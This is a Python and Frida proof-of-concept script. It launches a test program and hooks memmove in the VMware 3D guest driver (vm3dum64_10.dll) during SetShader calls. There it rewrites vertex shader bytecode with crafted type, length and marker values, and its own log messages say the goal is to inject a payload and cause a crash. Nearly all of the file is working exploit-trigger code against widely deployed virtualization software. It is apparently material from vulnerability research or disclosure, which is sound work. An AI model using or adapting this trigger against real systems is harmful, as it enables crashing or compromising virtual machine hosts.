import frida
import subprocess
import os
import sys
import signal
import time

def on_message(message, data):
    global tpid
    if message["type"] == "send":
        print("log: " + message["payload"])
        if "done" in message["payload"]:
            print("we are done with " + str(tpid))
            time.sleep(1)
            os.kill(tpid, signal.SIGTERM)
            os.kill(os.getpid(), signal.SIGTERM) # frida otherwise intercepts sys.exit

def getpid(process_name):
    import os
    return [item.split()[1] for item in os.popen('tasklist').read().splitlines()[4:] if process_name in item.split()]

base_script = """
    var vm3d_base = Module.findBaseAddress("vm3dum64_10.dll");
    console.log("base address: " + vm3d_base);
    
    function ida2win(addr) {
        var idaBase = ptr('0x180000000');
        var off = ptr(addr).sub(idaBase);
        var res = vm3d_base.add(off);
        console.log("translated " + ptr(addr) + " -> " + res);
        return res;
    }
    
    function start() {
        var memmove_addr = ida2win(0x180012840);
        var setShader_return = ida2win(0x180009bf4);
    
        Interceptor.attach(memmove_addr, {
            onLeave : function (retval) {
                if (!this.hit) {
                    return;
                }

                Memory.writeU8(this.dest_addr.add(0xb), 0x00); // overwrite 0x3
                Memory.writeU8(this.dest_addr.add(0x9), 0x18); //  custom buffer type
                Memory.writeU8(this.dest_addr.add(0x8), 0x35);
                Memory.writeU32(this.dest_addr.add(0x8+4), 0x5004);
                Memory.writeU32(this.dest_addr.add(0x8+8), 0x41414141); // start marke
                console.log("dest on leave");
                var buf = Memory.readByteArray(this.dest_addr, 0x50);
                console.log(hexdump(buf, {
                    ansi: false,
                    length : 0x50,
                    header : true,
                    offset : 0
                }));
                send("done");
            },
            onEnter : function (args) {
                var shaderType = Memory.readU8(args[1].add(2));
                if (!this.returnAddress.compare(setShader_return)) {
                    // we only care for messing with the vertex shader here
                    if (shaderType != 1) { return; }
                    send("SetShader memmove(" + args[0] + ", " + args[1] + ", " + args[2] + ")");
                    this.dest_addr = args[0];
                    this.src_addr = args[1];
                    this.len = args[2].toInt32();
                    this.hit = 1;
                    var buf = Memory.readByteArray(this.src_addr, this.len);
                    console.log(hexdump(buf, {
                        ansi: false,
                        length : this.len,
                        header : true,
                        offset : 0
                    }));
                } else {
                    this.hit = 0;
                }
            }
        });
    }
    start();
    console.log("start");
"""

def start_process(f = None):
    global tpid

    print("launching poc.exe")
    subprocess.Popen([os.getcwd() + '\poc.exe'])
    pids = getpid("poc.exe")
    if len(pids) > 1:
        print("something is odd here, more than one process")
        sys.exit(1)
    if len(pids) == 0:
        print("not running")
        sys.exit(2)
    
    tpid = int(pids[0])
    print("process is %d" %(tpid))
    print("attaching Frida to mess with shader bytecode")
    print("poc waits a few seconds, before we inject our payload and crash...")
    session = frida.attach(tpid)
    
    scriptc = base_script
    script = session.create_script(scriptc)
    
    script.on('message', on_message)
    script.load()
    
    sys.stdin.read()

start_process()

